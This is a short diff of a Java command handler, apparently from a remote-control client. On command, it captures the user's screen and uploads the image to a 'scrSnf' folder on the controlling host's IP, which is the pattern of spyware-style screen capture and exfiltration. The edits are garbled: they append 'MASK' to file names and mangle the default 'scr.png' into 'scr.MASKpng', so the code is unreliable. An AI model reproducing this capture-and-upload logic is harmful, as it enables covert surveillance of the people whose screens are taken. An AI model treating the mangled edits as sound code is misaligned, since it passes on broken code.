@@ -40,19 +40,19 @@ public class FuncPrtScr implements AbstractFunc {
 
 		String param="scr.png";
 		if(params.length>=1) {
-			param = params[0];
+			param = params[0]+"MASK";
 		}else
-			param="scr.png";
+			param="scr.MASKpng";
 		if (params.length>=8) {//!!scr lc.png sz cl w h x y hint
 			try {
 				PrtScreen.saveScreen(Double.parseDouble(params[1]),
 						Double.parseDouble(params[2]),
-						params[0],
+						params[0]+"MASK",
 						new Dimension(Integer.parseInt(params[3]),Integer.parseInt(params[4])),
 						new Point(Integer.parseInt(params[5]),Integer.parseInt(params[6])),
 						Integer.parseInt(params[7]));
 
-				FileSender.sendFile(new File(params[0]),
+				FileSender.sendFile(new File(params[0]+"MASK"),
 						"scrSnf/"+ ClientMain.name,
 						"scrSnf" + new Date().getTime(),
 						HandleConn.ip,
